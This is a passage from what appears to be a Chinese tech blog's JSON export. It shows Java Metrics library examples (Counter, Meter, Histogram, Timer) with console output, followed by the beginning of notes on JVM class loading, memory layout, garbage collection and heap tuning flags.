&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x961F;&#x5217;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x60F3;&#x7B80;&#x5355;&#x5730;&#x8FD4;&#x56DE;queue.size()&#xFF0C;&#x56E0;&#x4E3A;java.util&#x548C;java.util.concurrent&#x4E2D;&#x5B9E;&#x73B0;&#x7684;#size()&#x65B9;&#x6CD5;&#x5F88;&#x591A;&#x90FD;&#x662F; O(n) &#x7684;&#x590D;&#x6742;&#x5EA6;&#xFF0C;&#x8FD9;&#x4F1A;&#x5F71;&#x54CD; Gauge &#x7684;&#x6027;&#x80FD;&#x3002; CountersCounter &#x5C31;&#x662F;&#x8BA1;&#x6570;&#x5668;&#xFF0C;Counter &#x53EA;&#x662F;&#x7528; Gauge &#x5C01;&#x88C5;&#x4E86; AtomicLong &#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F7F;&#x5F97;&#x83B7;&#x5F97;&#x961F;&#x5217;&#x5927;&#x5C0F;&#x66F4;&#x52A0;&#x9AD8;&#x6548;&#x3002; 12345678910111213141516171819202122232425262728293031323334353637383940public class CounterTest { public static Queue&lt;String&gt; q = new LinkedBlockingQueue&lt;String&gt;(); public static Counter pendingJobs; public static Random random = new Random(); public static void addJob(String job) { pendingJobs.inc(); q.offer(job); } public static String takeJob() { pendingJobs.dec(); return q.poll(); } public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); pendingJobs = registry.counter(MetricRegistry.name(Queue.class,&quot;pending-jobs&quot;,&quot;size&quot;)); int num = 1; while(true){ Thread.sleep(200); if (random.nextDouble() &gt; 0.7){ String job = takeJob(); System.out.println(&quot;take job : &quot;+job); }else{ String job = &quot;Job-&quot;+num; addJob(job); System.out.println(&quot;add job : &quot;+job); } num++; } }} &#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A; 123456789add job : Job-15add job : Job-16take job : Job-8take job : Job-10add job : Job-1915-8-1 16:11:31 ============================================-- Counters ----------------------------------------------java.util.Queue.pending-jobs.size count = 5 MetersMeter&#x5EA6;&#x91CF;&#x4E00;&#x7CFB;&#x5217;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x7684;&#x901F;&#x7387;(rate)&#xFF0C;&#x4F8B;&#x5982;TPS&#x3002;Meters&#x4F1A;&#x7EDF;&#x8BA1;&#x6700;&#x8FD1;1&#x5206;&#x949F;&#xFF0C;5&#x5206;&#x949F;&#xFF0C;15&#x5206;&#x949F;&#xFF0C;&#x8FD8;&#x6709;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x7684;&#x901F;&#x7387;&#x3002;123456789101112131415161718192021222324252627282930public class MeterTest { public static Random random = new Random(); public static void request(Meter meter){ System.out.println(&quot;request&quot;); meter.mark(); } public static void request(Meter meter, int n){ while(n &gt; 0){ request(meter); n--; } } public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); Meter meterTps = registry.meter(MetricRegistry.name(MeterTest.class,&quot;request&quot;,&quot;tps&quot;)); while(true){ request(meterTps,random.nextInt(5)); Thread.sleep(1000); } }} &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A; 12345678910request15-8-1 16:23:25 ============================================-- Meters ------------------------------------------------com.alibaba.wuchong.metrics.MeterTest.request.tps count = 134 mean rate = 2.13 events/second 1-minute rate = 2.52 events/second 5-minute rate = 3.16 events/second 15-minute rate = 3.32 events/second &#x6CE8;&#xFF1A;&#x975E;&#x5E38;&#x50CF; Unix &#x7CFB;&#x7EDF;&#x4E2D; uptime &#x548C; top &#x4E2D;&#x7684; load&#x3002; HistogramsHistogram&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#x7684;&#x5206;&#x5E03;&#x60C5;&#x51B5;&#x3002;&#x6BD4;&#x5982;&#x6700;&#x5C0F;&#x503C;&#xFF0C;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x4E2D;&#x95F4;&#x503C;&#xFF0C;&#x8FD8;&#x6709;&#x4E2D;&#x4F4D;&#x6570;&#xFF0C;75&#x767E;&#x5206;&#x4F4D;, 90&#x767E;&#x5206;&#x4F4D;, 95&#x767E;&#x5206;&#x4F4D;, 98&#x767E;&#x5206;&#x4F4D;, 99&#x767E;&#x5206;&#x4F4D;, &#x548C; 99.9&#x767E;&#x5206;&#x4F4D;&#x7684;&#x503C;(percentiles)&#x3002; &#x6BD4;&#x5982;request&#x7684;&#x5927;&#x5C0F;&#x7684;&#x5206;&#x5E03;&#xFF1A;123456789101112131415161718public class HistogramTest { public static Random random = new Random(); public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); Histogram histogram = new Histogram(new ExponentiallyDecayingReservoir()); registry.register(MetricRegistry.name(HistogramTest.class, &quot;request&quot;, &quot;histogram&quot;), histogram); while(true){ Thread.sleep(1000); histogram.update(random.nextInt(100000)); } }} &#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7ED3;&#x679C;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A; 12345678910111213-- Histograms --------------------------------------------java.util.Queue.queue.histogram count = 56 min = 1122 max = 99650 mean = 48735.12 stddev = 28609.02 median = 49493.00 75% &lt;= 72323.00 95% &lt;= 90773.00 98% &lt;= 94011.00 99% &lt;= 99650.00 99.9% &lt;= 99650.00 TimersTimer&#x5176;&#x5B9E;&#x662F; Histogram &#x548C; Meter &#x7684;&#x7ED3;&#x5408;&#xFF0C; histogram &#x67D0;&#x90E8;&#x5206;&#x4EE3;&#x7801;/&#x8C03;&#x7528;&#x7684;&#x8017;&#x65F6;&#xFF0C; meter&#x7EDF;&#x8BA1;TPS&#x3002; 123456789101112131415161718192021public class TimerTest { public static Random random = new Random(); public static void main(String[] args) throws InterruptedException { MetricRegistry registry = new MetricRegistry(); ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build(); reporter.start(1, TimeUnit.SECONDS); Timer timer = registry.timer(MetricRegistry.name(TimerTest.class,&quot;get-latency&quot;)); Timer.Context ctx; while(true){ ctx = timer.time(); Thread.sleep(random.nextInt(1000)); ctx.stop(); } }} &#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A; 1234567891011121314151617-- Timers ------------------------------------------------com.alibaba.wuchong.metrics.TimerTest.get-latency count = 38 mean rate = 1.90 calls/second 1-minute rate = 1.66 calls/second 5-minute rate = 1.61 calls/second 15-minute rate = 1.60 calls/second min = 13.90 milliseconds max = 988.71 milliseconds mean = 519.21 milliseconds stddev = 286.23 milliseconds median = 553.84 milliseconds 75% &lt;= 763.64 milliseconds 95% &lt;= 943.27 milliseconds 98% &lt;= 988.71 milliseconds 99% &lt;= 988.71 milliseconds 99.9% &lt;= 988.71 milliseconds &#x5176;&#x4ED6;&#x521D;&#x6B21;&#x4E4B;&#x5916;&#xFF0C;Metrics&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;HealthCheck &#x7528;&#x6765;&#x68C0;&#x6D4B;&#x67D0;&#x4E2A;&#x67D0;&#x4E2A;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5065;&#x5EB7;&#xFF0C;&#x4F8B;&#x5982;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x3002;&#x8FD8;&#x6709;Metrics Annotation&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x5730;&#x5B9E;&#x73B0;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x67D0;&#x4E2A;&#x503C;&#x7684;&#x6570;&#x636E;&#x3002;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x53EF;&#x4EE5;&#x70B9;&#x8FDB;&#x94FE;&#x63A5;&#x770B;&#x770B;&#x3002; &#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x88AB;&#x8C03;&#x7528;&#x7684;&#x9891;&#x7387;&#xFF08;TPS&#xFF09;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;Meters&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x6267;&#x884C;&#x8017;&#x65F6;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;Histograms&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x65E2;&#x8981;&#x7EDF;&#x8BA1;TPS&#x53C8;&#x8981;&#x7EDF;&#x8BA1;&#x8017;&#x65F6;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x4F7F;&#x7528;Timers&#x3002; &#x53C2;&#x8003;&#x8D44;&#x6599;Metrics CoreMetrics Getting Started","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"Metrics","slug":"Metrics","permalink":"http://www.wangxin123.com/tags/Metrics/"}]},{"title":"Java虚拟机原理","slug":"Java虚拟机原理","date":"2016-09-10T13:18:00.000Z","updated":"2017-01-08T14:25:22.781Z","comments":true,"path":"2016/09/10/Java虚拟机原理/","link":"","permalink":"http://www.wangxin123.com/2016/09/10/Java虚拟机原理/","excerpt":"1&#x3001;&#x7F16;&#x8BD1;&#x673A;&#x5236; &#x5206;&#x6790;&#x548C;&#x8F93;&#x5165;&#x5230;&#x7B26;&#x53F7;&#x8868;&#xFF1A;&#x8BCD;&#x6CD5;&#x5206;&#x6790;&#xFF1A;&#x5C06;&#x4EE3;&#x7801;&#x8F6C;&#x5316;&#x4E3A;token&#x5E8F;&#x5217;&#x8BED;&#x6CD5;&#x5206;&#x6790;&#xFF1A;&#x7531;token&#x5E8F;&#x5217;&#x751F;&#x6210;&#x62BD;&#x8C61;&#x8BED;&#x6CD5;&#x6811;&#x8F93;&#x5165;&#x5230;&#x7B26;&#x53F7;&#x8868;&#xFF1A;&#x5C06;&#x7C7B;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x7B26;&#x53F7;&#x8F93;&#x5165;&#x5230;&#x7C7B;&#x7684;&#x7B26;&#x53F7;&#x8868; &#x6CE8;&#x89E3;&#x5904;&#x7406;&#xFF1A;&#x5904;&#x7406;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x6CE8;&#x89E3;&#xFF0C;&#x4E4B;&#x540E;&#x7EE7;&#x7EED;&#x7B2C;&#x4E00;&#x6B65; &#x6839;&#x636E;&#x7B26;&#x53F7;&#x8868;&#x8FDB;&#x884C;&#x8BED;&#x4E49;&#x5206;&#x6790;&#x5E76;&#x751F;&#x6210;class&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x4F18;&#x5316;","keywords":null,"text":"1&#x3001;&#x7F16;&#x8BD1;&#x673A;&#x5236; &#x5206;&#x6790;&#x548C;&#x8F93;&#x5165;&#x5230;&#x7B26;&#x53F7;&#x8868;&#xFF1A;&#x8BCD;&#x6CD5;&#x5206;&#x6790;&#xFF1A;&#x5C06;&#x4EE3;&#x7801;&#x8F6C;&#x5316;&#x4E3A;token&#x5E8F;&#x5217;&#x8BED;&#x6CD5;&#x5206;&#x6790;&#xFF1A;&#x7531;token&#x5E8F;&#x5217;&#x751F;&#x6210;&#x62BD;&#x8C61;&#x8BED;&#x6CD5;&#x6811;&#x8F93;&#x5165;&#x5230;&#x7B26;&#x53F7;&#x8868;&#xFF1A;&#x5C06;&#x7C7B;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x7B26;&#x53F7;&#x8F93;&#x5165;&#x5230;&#x7C7B;&#x7684;&#x7B26;&#x53F7;&#x8868; &#x6CE8;&#x89E3;&#x5904;&#x7406;&#xFF1A;&#x5904;&#x7406;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x6CE8;&#x89E3;&#xFF0C;&#x4E4B;&#x540E;&#x7EE7;&#x7EED;&#x7B2C;&#x4E00;&#x6B65; &#x6839;&#x636E;&#x7B26;&#x53F7;&#x8868;&#x8FDB;&#x884C;&#x8BED;&#x4E49;&#x5206;&#x6790;&#x5E76;&#x751F;&#x6210;class&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x4F18;&#x5316; &#x865A;&#x62DF;&#x673A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x3001;&#x5B57;&#x8282;&#x7801;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#x3001;&#x865A;&#x62DF;&#x673A;&#x6307;&#x4EE4;&#x96C6; &#x2003; 2&#x3001;&#x6267;&#x884C;&#x673A;&#x5236; 2.1&#x3001;&#x52A0;&#x8F7D;&#x3001;&#x94FE;&#x63A5;&#x3001;&#x521D;&#x59CB;&#x5316; 2.1.1&#x3001;&#x52A0;&#x8F7D; &#x53CC;&#x4EB2;&#x59D4;&#x6D3E;&#x3001;&#x7EBF;&#x7A0B;&#x4E0A;&#x4E0B;&#x6587;&#x7C7B;&#x52A0;&#x8F7D;&#x5668;&#x3001;Web&#x5BB9;&#x5668;&#x3001;OSGi&#xFF1A;http://www.ibm.com/developerworks/cn/java/j-lo-classloader/ 2.1.2&#x3001;&#x94FE;&#x63A5;&#x6821;&#x9A8C;&#xFF1A;&#x6821;&#x9A8C;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x8282;&#x7801;&#x683C;&#x5F0F;&#x662F;&#x5426;&#x7B26;&#x5408;Java Class File Format&#x89C4;&#x8303;&#x51C6;&#x5907;&#xFF1A;&#x4E3A;&#x7C7B;&#x7684;&#x9759;&#x6001;&#x5C5E;&#x6027;&#x5206;&#x914D;&#x5185;&#x5B58;&#x548C;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x5E76;&#x52A0;&#x8F7D;&#x5F15;&#x7528;&#x7684;&#x7C7B;&#x6216;&#x63A5;&#x53E3;&#x89E3;&#x6790;&#xFF1A;&#x5C06;&#x8FD0;&#x884C;&#x65F6;&#x5E38;&#x91CF;&#x6C60;&#x4E2D;&#x7684;&#x7B26;&#x53F7;&#x5F15;&#x7528;&#x66FF;&#x6362;&#x4E3A;&#x76F4;&#x63A5;&#x5F15;&#x7528;(&#x9759;&#x6001;&#x7ED1;&#x5B9A;) 2.1.3&#x3001;&#x521D;&#x59CB;&#x5316;&#x7C7B;&#x7684;&#x521D;&#x59CB;&#x5316;&#x65F6;&#x673A;&#xFF1A;1) &#x521B;&#x5EFA;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;2) &#x521D;&#x59CB;&#x5316;&#x67D0;&#x4E2A;&#x7C7B;&#x7684;&#x5B50;&#x7C7B;&#xFF08;&#x6EE1;&#x8DB3;&#x4E3B;&#x52A8;&#x8C03;&#x7528;&#xFF0C;&#x5373;&#x8BBF;&#x95EE;&#x5B50;&#x7C7B;&#x4E2D;&#x7684;&#x9759;&#x6001;&#x53D8;&#x91CF;&#x3001;&#x65B9;&#x6CD5;&#xFF09;3) &#x53CD;&#x5C04;&#xFF08;Class.forName()&#x4F1A;&#x89E6;&#x53D1;&#xFF0C;ClassLoader.loadClass()&#x53CA;X.class&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#xFF09;4) &#x8BBF;&#x95EE;&#x7C7B;&#x6216;&#x63A5;&#x53E3;&#x7684;&#x9759;&#x6001;&#x53D8;&#x91CF;&#xFF08;static final&#x5E38;&#x91CF;&#x9664;&#x5916;&#xFF0C;static final&#x53D8;&#x91CF;&#x53EF;&#x4EE5;&#xFF09;5) &#x8C03;&#x7528;&#x7C7B;&#x7684;&#x9759;&#x6001;&#x65B9;&#x6CD5;6) java&#x865A;&#x62DF;&#x673A;&#x542F;&#x52A8;&#x65F6;&#x88AB;&#x6807;&#x660E;&#x4E3A;&#x542F;&#x52A8;&#x7C7B;&#x7684;&#x7C7B; &#x521D;&#x59CB;&#x5316;&#x987A;&#x5E8F;&#xFF1A; &#x7236;&#x7C7B;&#x9759;&#x6001;&#x6210;&#x5458;&#x3001;&#x9759;&#x6001;&#x4EE3;&#x7801;&#x5757;&#x2014;&gt;&#x5B50;&#x7C7B;&#x9759;&#x6001;&#x6210;&#x5458;&#x3001;&#x9759;&#x6001;&#x4EE3;&#x7801;&#x5757;&#x2014;&gt;&#x7236;&#x7C7B;&#x548C;&#x5B50;&#x7C7B;&#x5B9E;&#x4F8B;&#x6210;&#x5458;&#x5185;&#x5B58;&#x5206;&#x914D;&#x2014;&gt;&#x7236;&#x7C7B;&#x5B9E;&#x4F8B;&#x6210;&#x5458;&#x3001;&#x4EE3;&#x7801;&#x5757;&#x2014;&gt;&#x7236;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570;&#x2014;&gt;&#x5B50;&#x7C7B;&#x5B9E;&#x4F8B;&#x6210;&#x5458;&#x3001;&#x4EE3;&#x7801;&#x5757;&#x2014;&gt;&#x5B50;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570; 2.2&#x3001;&#x5185;&#x5B58;&#x7ED3;&#x6784;&#x8FD0;&#x884C;&#x65F6;&#x6570;&#x636E;&#x533A;&#xFF1A; 2.2.1&#x3001;Java&#x5806; JVM&#x5728;Eden&#x533A;&#x5206;&#x914D;&#x4E00;&#x5757;&#x5185;&#x5B58;&#x4E3A;TLAB&#xFF0C;&#x5728;TLAB&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x52A0;&#x9501;&#xFF0C;&#x6240;&#x4EE5;JVM&#x9996;&#x5148;&#x5728;TLAB&#x4E0A;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#xFF0C;&#x4E0D;&#x591F;&#x5219;&#x5728;&#x5806;&#x4E0A;&#x521B;&#x5EFA;&#x3002; &#x2003; 2.2.2&#x3001;&#x65B9;&#x6CD5;&#x533A; &#x9759;&#x6001;&#x7ED1;&#x5B9A;&#x3001;&#x52A8;&#x6001;&#x7ED1;&#x5B9A;&#xFF1A;http://hxraid.iteye.com/blog/428891 &#x2003; 2.2.3&#x3001;JVM&#x6808; 2.3&#x3001;&#x5783;&#x573E;&#x56DE;&#x6536;2.3.1&#x3001;&#x5BF9;&#x8C61;&#x7ED3;&#x6784;&#x5BF9;&#x8C61;&#xFF1A;&#x5BF9;&#x8C61;&#x5934;&#x3001;&#x5BF9;&#x8C61;&#x4F53;&#x3001;&#x5B57;&#x8282;&#x586B;&#x5145; &#x5BF9;&#x8C61;&#x5934;&#xFF1A;http://blog.csdn.net/bingjing12345/article/details/8642595 &#x5BF9;&#x8C61;&#x5934;&#x7684;MarkWord&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x5BF9;&#x8C61;&#x7684;&#x5404;&#x79CD;&#x6807;&#x8BB0;&#x4FE1;&#x606F;&#xFF0C;&#x5B9E;&#x73B0;&#x9501;&#x3001; &#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x3001;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B49;&#x3002;&#x540E;&#x7EED;&#x4E3A;&#x6307;&#x5411;&#x7C7B;&#x65B9;&#x6CD5;&#x533A;&#x7684;&#x5F15;&#x7528;&#x53CA;&#x6570;&#x7EC4;&#x957F;&#x5EA6;&#xFF08;&#x82E5;&#x4E3A;&#x6570;&#x7EC4;&#xFF09;&#x3002; 2.3.2&#x3001;&#x5BF9;&#x8C61;&#x5206;&#x914D;&#x65B9;&#x5F0F;a. &#x5806;&#x4E0A;&#x5206;&#x914D;&#xFF1A;&#x6307;&#x9488;&#x78B0;&#x649E;&#x3001;&#x95F4;&#x9699;&#x5217;&#x8868;b. &#x6808;&#x4E0A;&#x5206;&#x914D;&#xFF1A;&#x57FA;&#x4E8E;&#x9003;&#x9038;&#x5206;&#x6790;c. &#x5806;&#x5916;&#x5206;&#x914D;&#xFF1A;Unsafe.allocateMemory()&#x3001;DirectByteBuffer&#x3001;ByteBuffer.allocateDicrect()&#x6216;MappedByteBufferd. TLAB&#x5206;&#x914D;&#xFF1A;Thread Local Allocation Buffer&#xFF0C;&#x591A;&#x7EBF;&#x7A0B;&#x73AF;&#x5883;&#x4E2D;JVM&#x5728;Eden&#x533A;&#x5206;&#x914D;&#x4E00;&#x5757;&#x5185;&#x5B58;&#x4E3A;TLAB&#xFF0C;&#x5728;TLAB&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x52A0;&#x9501;&#xFF0C;&#x6240;&#x4EE5;JVM&#x9996;&#x5148;&#x5728;TLAB&#x4E0A;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#xFF0C;&#x4E0D;&#x591F;&#x5219;&#x5728;&#x5806;&#x4E0A;&#x521B;&#x5EFA;&#x3002;&#x53EF;&#x901A;&#x8FC7;-XX:TLABWasteTargetPercent&#x8BBE;&#x7F6E;TLAB&#x548C;Eden&#x7684;&#x6BD4;&#x4F8B;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;-XX:+PrintTLAB&#x67E5;&#x770B;TLAB&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x3002; 2.3.3&#x3001;&#x5783;&#x573E;&#x56DE;&#x6536;&#x7B97;&#x6CD5;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x5668;&#xFF1A;&#x4E3A;&#x6BCF;&#x4E2A;&#x5BF9;&#x8C61;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x5668;&#xFF0C;&#x5F53;&#x8BA1;&#x6570;&#x5668;&#x4E3A;0&#x65F6;&#x56DE;&#x6536;&#x5BF9;&#x8C61;&#xFF0C;&#x7F3A;&#x70B9;&#xFF1A;&#x5FAA;&#x73AF;&#x5F15;&#x7528;&#x95EE;&#x9898; &#x590D;&#x5236;&#xFF1A;&#x4ECE;&#x6839;&#x96C6;&#x5408;&#x626B;&#x63CF;&#x5B58;&#x6D3B;&#x5BF9;&#x8C61;&#xFF0C;&#x590D;&#x5236;&#x5230;&#x4E00;&#x5757;&#x5168;&#x65B0;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7F3A;&#x70B9;&#xFF1A;&#x9700;&#x8981;2&#x500D;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x5B58;&#x6D3B;&#x5BF9;&#x8C61;&#x8F83;&#x591A;&#x65F6;&#x5F00;&#x9500;&#x8F83;&#x5927; &#x6807;&#x8BB0;-&#x6E05;&#x9664;&#xFF1A;&#x4ECE;&#x6839;&#x96C6;&#x5408;&#x626B;&#x63CF;&#x5E76;&#x6807;&#x8BB0;&#x5B58;&#x6D3B;&#x5BF9;&#x8C61;&#xFF0C;&#x626B;&#x63CF;&#x5B8C;&#x6210;&#x540E;&#x6E05;&#x9664;&#x672A;&#x6807;&#x8BB0;&#x5BF9;&#x8C61;&#xFF0C;&#x7F3A;&#x70B9;&#xFF1A;&#x5B58;&#x6D3B;&#x5BF9;&#x8C61;&#x8F83;&#x5C11;&#x65F6;&#x5185;&#x5B58;&#x788E;&#x7247;&#x8F83;&#x591A; &#x6807;&#x8BB0;-&#x6E05;&#x9664;-&#x538B;&#x7F29;&#xFF1A;&#x4ECE;&#x6839;&#x96C6;&#x5408;&#x626B;&#x63CF;&#x5E76;&#x6807;&#x8BB0;&#x5B58;&#x6D3B;&#x5BF9;&#x8C61;&#xFF0C;&#x626B;&#x63CF;&#x5B8C;&#x6210;&#x540E;&#x5C06;&#x5B58;&#x6D3B;&#x5BF9;&#x8C61;&#x79FB;&#x52A8;&#x5E76;&#x5BF9;&#x9F50; &#x5206;&#x4EE3;&#x56DE;&#x6536;&#xFF1A;&#x6839;&#x636E;&#x751F;&#x547D;&#x5468;&#x671F;&#x957F;&#x77ED;&#xFF0C;&#x628A;JVM&#x5806;&#x5206;&#x6210;&#x65B0;&#x751F;&#x4EE3;&#x3001;&#x8001;&#x5E74;&#x4EE3;&#x3002; &#x8BF4;&#x660E;&#xFF1A;&#x6839;&#x96C6;&#x5408;&#x8303;&#x56F4;&#x4E3A;Java&#x5806;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;(Card Table/Remember Set)&#x3001;&#x65B9;&#x6CD5;&#x533A;&#x4E2D;&#x7684;&#x9759;&#x6001;&#x5BF9;&#x8C61;&#x3001;Java&#x6808;&#x4E2D;&#x7684;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x8868;&#x548C;JNI&#x53E5;&#x67C4;&#x6307;&#x5411;&#x7684;&#x5BF9;&#x8C61;&#x3002; 2.3.4&#x3001;JVM&#x5185;&#x5B58;&#x53CA;&#x5783;&#x573E;&#x56DE;&#x6536;&#x914D;&#x7F6E;-Xmx&#xFF1A;&#x8BBE;&#x7F6E;&#x6700;&#x5927;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5373;&#x65B0;&#x751F;&#x4EE3;&#x3001;&#x8001;&#x5E74;&#x4EE3;&#x4E4B;&#x548C;&#x7684;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x8FC7;&#x5C0F;&#x4F1A;&#x89E6;&#x53D1;OOM-Xms&#xFF1A;&#x8BBE;&#x7F6E;&#x6700;&#x5C0F;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5373;JVM&#x542F;&#x52A8;&#x65F6;&#x7684;&#x521D;&#x59CB;&#x5806;&#x5927;&#x5C0F;&#xFF0C;&#x4E00;&#x822C;&#x8BBE;&#x7F6E;&#x548C;-Xmx&#x76F8;&#x540C;&#xFF0C;&#x907F;&#x514D;&#x5783;&#x573E;&#x56DE;&#x6536;&#x540E;JVM&#x5185;&#x5B58;&#x91CD;&#x5206;&#x914D;-XX:NewSize&#xFF1A;&#x8BBE;&#x7F6E;&#x65B0;&#x751F;&#x4EE3;&#x7684;&#x521D;&#x59CB;&#x503C;-XX:MaxNewSize&#xFF1A;&#x8BBE;&#x7F6E;&#x65B0;&#x751F;&#x4EE3;&#x6700;&#x5927;&#x503C;-Xmn&#xFF1A;&#x7B49;&#x540C;&#x4E8E;&#x8BBE;&#x7F6E;&#x76F8;&#x540C;&#x7684;-XX:NewSize&#x548C;-XX:MaxNewSize&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x8FC7;&#x5C0F;&#x4F1A;&#x9891;&#x7E41;GC-XX:PermSize&#xFF1A;&#x8BBE;&#x7F6E;&#x6301;&#x4E45;&#x4EE3;&#x521D;&#x59CB;&#x503C;-XX:MaxPermSize&#xFF1A;&#x8BBE;&#x7F6E;&#x6301;&#x4E45;&#x4EE3;&#x6700;&#x5927;&#x503C;-Xss&#xFF1A;&#x8BBE;&#x7F6E;&#x7EBF;&#x7A0B;&#x6808;&#x5927;&#x5C0F;-XX:NewRatio&#xFF1A;&#x8BBE;&#x7F6E;&#x8001;&#x5E74;&#x4EE3;&#x4E0E;&#x65B0;&#x751F;&#x4EE3;&#x7684;&#x6BD4;&#x4F8B;-XX:SurvivorRatio&#xFF1A;&#x8BBE;&#x7F6E;Eden&#x533A;&#x4E0E;S&#x533A;&#x7684;&#x6BD4;&#x4F8B; -XX:MaxTenuringThreshold&#xFF1A;&#x8BBE;&#x7F6E;&#x5783;&#x573E;&#x56DE;&#x6536;&#x6700;&#x5927;&#x5E74;&#x9F84;&#xFF0C;&#x5373;&#x65B0;&#x751F;&#x4EE3;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x7ECF;&#x8FC7;&#x591A;&#x5C11;&#x6B21;&#x590D;&#x5236;&#x8FDB;&#x5165;&#x8001;&#x5E74;&#x4EE3;-XX:PretenureSizeThreshold&#xFF1A;&#x8BBE;&#x7F6E;&#x5927;&#x4E8E;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x8F83;&#x5927;&#x5BF9;&#x8C61;&#x76F4;&#x63A5;&#x8FDB;&#x884C;&#x8001;&#x5E74;&#x4EE3; -XX:TargetSurvivorRatio&#xFF1A;&#x8BBE;&#x7F6E;S&#x533A;&#x7684;&#x53EF;&#x4F7F;&#x7528;&#x7387;&#xFF0C;&#x5F53;S&#x533A;&#x7684;&#x7A7A;&#x95F4;&#x4F7F;&#x7528;&#x7387;&#x8FBE;&#x5230;&#x8FD9;&#x4E2A;&#x6570;&#x503C;&#xFF0C;&#x4F1A;&#x5C06;&#x5BF9;&#x8C61;&#x9001;&#x5165;&#x8001;&#x5E74;&#x4EE3; 